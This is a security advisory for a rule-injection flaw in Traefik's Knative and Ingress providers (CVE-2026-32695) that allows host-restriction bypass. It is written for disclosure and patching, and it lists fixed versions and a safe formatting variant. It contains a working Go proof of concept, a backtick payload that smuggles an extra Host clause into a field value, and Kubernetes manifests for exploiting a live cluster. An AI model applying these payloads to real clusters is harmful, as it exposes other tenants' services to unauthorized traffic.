# [M] Traefik has Knative Ingress Rule Injection that Allows Host Restriction Bypass

## Summary
Severity: Medium
Advisory: GHSA-67jx-r9pv-98rj
CVE: CVE-2026-32695
CWE: CWE-74
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:N/VI:N/VA:N/SC:H/SI:N/SA:N (CVSS_V4)
Published: 2026-03-27
Source: https://github.com/advisories/GHSA-67jx-r9pv-98rj
Type: github-advisory

## Affected
- Go: `github.com/traefik/traefik/v3` — affected >=0 <3.6.11
- Go: `github.com/traefik/traefik/v3` — affected >=3.7.0-ea.1 <3.7.0-ea.2
- Go: `github.com/traefik/traefik/v2` — affected >=0

## Details
## Summary

There is a potential vulnerability in Traefik's Kubernetes Knative, Ingress, and Ingress-NGINX providers related to rule injection.

User-controlled values are interpolated into backtick-delimited Traefik router rule expressions without escaping or validation. A malicious value containing a backtick can terminate the literal and inject additional operators into Traefik's rule language, altering the parsed rule tree. In shared or multi-tenant deployments, this can bypass host and header routing constraints and redirect unauthorized traffic to victim services.

## Patches

- https://github.com/traefik/traefik/releases/tag/v3.6.11
- https://github.com/traefik/traefik/releases/tag/v3.7.0-ea.2

## For more information

If there are any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

<details>
<summary>Original Description</summary>

### Summary
Traefik's Knative provider builds router rules by interpolating user-controlled values into backtick-delimited rule expressions without escaping. In live cluster validation, Knative `rules[].hosts[]` was exploitable for host restriction bypass (for example `tenant.example.com`) || Host(`attacker.com`), producing a router that serves attacker-controlled hosts. Knative `headers[].exact` also allows rule-syntax injection and proves unsafe rule construction. In multi-tenant clusters, this can route unauthorized traffic to victim services and lead to cross-tenant traffic exposure. Severity is High in shared deployments.

Tested on Traefik `v3.6.10`; the vulnerable pattern appears to have been present since the Knative provider was introduced. Earlier versions with Knative provider support are expected to be affected.

### Details
The issue is caused by unsafe rule-string construction using `fmt.Sprintf` with backtick-delimited literals.

Incriminated code patterns:

- `pkg/provider/kubernetes/knative/kubernetes.go`
  - `fmt.Sprintf("Host(`%v`)", host)`
  - `fmt.Sprintf("Header(`%s`,`%s`)", key, headers[key].Exact)`
  - `fmt.Sprintf("PathPrefix(`%s`)", path)`

- `pkg/provider/kubernetes/ingress/kubernetes.go`
  - `fmt.Sprintf("Host(`%s`)", host)`
  - `fmt.Sprintf("(Path(`%[1]s`) || PathPrefix(`%[1]s/`))", path)`

- `pkg/provider/kubernetes/ingress-nginx/kubernetes.go` (hardening candidate; not the primary confirmed vector in this report)
  - `fmt.Sprintf("Header(`%s`, `%s`)", c.Header, c.HeaderValue)`
  - related host/path/header concatenations with backticks

Because inputs are inserted directly into rule expressions, a malicious value containing a backtick can terminate the literal and inject additional operators/tokens in Traefik's rule language. Example payload:

- `x`) || Host(`attacker.com`

When used as a header value in Knative rule construction, the resulting rule contains:

- `Header(`X-Poc`,`x`) || Host(`attacker.com`)`

This alters rule semantics and enables injection into Traefik's rule language. Depending on the field used (`hosts[]` vs `headers[].exact`) this can become a direct routing bypass.

Important scope note:

- Gateway API code path (`pkg/provider/kubernetes/gateway/httproute.go`) already uses safer `%q` formatting for header/query rules and is not affected by this exact pattern.
- For standard Kubernetes Ingress, `spec.rules.host` is validated as DNS-1123 by the API server, which rejects backticks (so this specific host-injection payload is typically blocked).
- For Knative Ingress, `rules[].hosts[]` and `headers[].exact` are typed as `string` in CRD schema with no pattern constraint.
- In this validation environment, `rules[].hosts[]` was accepted and produced a practical host bypass. `headers[].exact` was also accepted and produced rule-syntax injection in generated routers.
- Ingress-NGINX patterns are included as follow-up hardening targets and are not claimed as independently exploitable here.
- Exploitability depends on admission/validation policy and who can create these resources.

### PoC

1. Local deterministic PoC (no cluster required):

- Run:
  - Save the inline PoC below as `poc_build_rule.go`
  - Run `go run poc_build_rule.go`
- Observe output:
  - Legitimate rule: `(Host(`tenant.example.com`)) && (Header(`X-API-Key`,`secret123`)) && PathPrefix(`/`)`
  - Malicious rule: `(Host(`tenant.example.com`)) && (Header(`X-API-Key`,`x`) || Host(`attacker.com`)) && PathPrefix(`/`)`
- This proves syntax injection in current string-construction logic.

Inline PoC code (self-contained):

```go
package main

import (
	"fmt"
	"sort"
	"strings"
)

func buildRuleKnative(hosts []string, headers map[string]struct{ Exact string }, path string) string {
	var operands []string

	if len(hosts) > 0 {
		var hostRules []string
		for _, host := range hosts {
			hostRules = append(hostRules, fmt.Sprintf("Host(`%v`)", host))
		}
		operands = append(operands, fmt.Sprintf("(%s)", strings.Join(hostRules, " || ")))
	}

	if len(headers) > 0 {
		headerKeys := make([]string, 0, len(headers))
		for k := range headers {
			headerKeys = append(headerKeys, k)
		}
		sort.Strings(headerKeys)

		var headerRules []string
		for _, key := range headerKeys {
			headerRules = append(headerRules, fmt.Sprintf("Header(`%s`,`%s`)", key, headers[key].Exact))
		}
		operands = append(operands, fmt.Sprintf("(%s)", strings.Join(headerRules, " && ")))
	}

	if len(path) > 0 {
		operands = append(operands, fmt.Sprintf("PathPrefix(`%s`)", path))
	}

	return strings.Join(operands, " && ")
}

func main() {
	legitHeaders := map[string]struct{ Exact string }{
		"X-API-Key": {Exact: "secret123"},
	}
	fmt.Println(buildRuleKnative([]string{"tenant.example.com"}, legitHeaders, "/"))

	maliciousHeaders := map[string]struct{ Exact string }{
		"X-API-Key": {Exact: "x`) || Host(`attacker.com"},
	}
	fmt.Println(buildRuleKnative([]string{"tenant.example.com"}, maliciousHeaders, "/"))

	// Safe variant example (Gateway-style):
	fmt.Println(fmt.Sprintf("Header(%q,%q)", "X-API-Key", "x`) || Host(`attacker.com"))
}
```

2. Cluster PoC (Knative host injection, primary / practical bypass):

- Preconditions:
  - Kubernetes test cluster with Knative Serving.
  - Traefik configured with Knative provider.
- Apply manifest:
  - `kubectl apply -f - <<'YAML'`
```yaml
apiVersion: networking.internal.knative.dev/v1alpha1
kind: Ingress
metadata:
  name: poc-host-injection
  namespace: default
  annotations:
    # This exact key worked in live validation:
    networking.knative.dev/ingress.class: "traefik.ingress.networking.knative.dev"
spec:
  rules:
    - hosts:
        - 'tenant.example.com`) || Host(`attacker.com'
      visibility: External
      http:
        paths:
          - path: "/"
            splits:
              - percent: 100
                serviceName: dummy
                serviceNamespace: default
                servicePort: 80
YAML
```
  - (If API version mismatch, adjust between `networking.internal.knative.dev/v1alpha1` and `networking.knative.dev/v1alpha1`.)
- Verify:
  - Check Traefik router rule contains: `(Host(`tenant.example.com`) || Host(`attacker.com`)) && PathPrefix(`/`)`.
  - Request with `Host: attacker.com` returns backend 200.
  - This demonstrates host restriction bypass in practice.

3. Cluster PoC (Knative header injection, confirms rule-syntax injection):

- Apply:
  - `kubectl apply -f - <<'YAML'`
```yaml
apiVersion: networking.internal.knative.dev/v1alpha1
kind: Ingress
metadata:
  name: poc-rule-injection
  namespace: default
  annotations:
    networking.knative.dev/ingress.class: "traefik.ingress.networking.knative.dev"
spec:
  rules:
    - hosts:
        - "tenant.example.com"
      visibility: External
      http:
        paths:
          - path: "/"
            headers:
              X-Poc:
                exact: 'x`) || Host(`attacker.com'
            splits:
              - percent: 100
                serviceName: dummy
                serviceNamespace: default
                servicePort: 80
YAML
```
- Verify:
  - Inspect generated Traefik dynamic router rule (API/dashboard/logs).
  - Confirm injected fragment `|| Host(`attacker.com`)` is present.
  - Send request with `Host: attacker.com` and no expected tenant header (expected: 404 for this payload shape, because leading `Host(tenant)` still applies).
  - Send request with `Host: tenant.example.com` and `X-Poc: x` (expected: 200 from backend).

4. Optional Ingress PoC (scope check):

- Apply:
  - `kubectl apply -f - <<'YAML'`
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: poc-ingress-host-injection
  namespace: default
  annotations:
    kubernetes.io/ingress.class: traefik
spec:
  rules:
    - host: 'tenant.example.com`) || Host(`attacker.com'
      http:
        paths:
          - path: /
            pathType: Prefix
            backend:
              service:
                name: dummy
                port:
                  number: 80
YAML
```
- Expected in most clusters: API server rejects this payload because Ingress `host` must satisfy DNS-1123.
- Keep this step only as a negative control to demonstrate the distinction between native Ingress validation and Knative CRD behavior.

Validation executed in this report:

- Local deterministic PoC executed with `go run` and output matched expected injected rule.
- Live cluster test executed on local `kind` cluster (`kind-traefik-poc`) with Traefik `v3.6.10` and Knative Serving CRDs.
- Annotation key confirmed in this environment: `networking.knative.dev/ingress.class` (dot). The hyphen variant was not used by the successful processing path.
- Traefik API/logs confirmed generated routers included injected expressions.
- Live HTTP request with `Host: attacker.com` reached backend (`200`) for Knative host-injection payload.

### Impact
- **Vulnerability type:** Rule injection / authorization bypass at routing layer.
- **Primary impact:** Bypass of intended routing predicates (host/header/path), enabling unauthorized routing to protected services.
- **Who is impacted:** Primarily deployments using Traefik Knative provider where untrusted or semi-trusted actors can create/update Knative Ingress resources (typical in multi-tenant clusters, shared namespaces, or weak admission controls). Standard Kubernetes Ingress host injection is usually blocked by API validation.
- **Security consequences:** Cross-tenant traffic access, internal service exposure, policy bypass, and potential chaining with app-level vulnerabilities.

</details>

## References
- https://github.com/traefik/traefik/security/advisories/GHSA-67jx-r9pv-98rj
- https://nvd.nist.gov/vuln/detail/CVE-2026-32695
- https://github.com/traefik/traefik/commit/11d251415a6fd935025df5a9dda898e17e3097b2
- https://github.com/traefik/traefik
- https://github.com/traefik/traefik/releases/tag/v3.6.11
- https://github.com/traefik/traefik/releases/tag/v3.7.0-ea.2
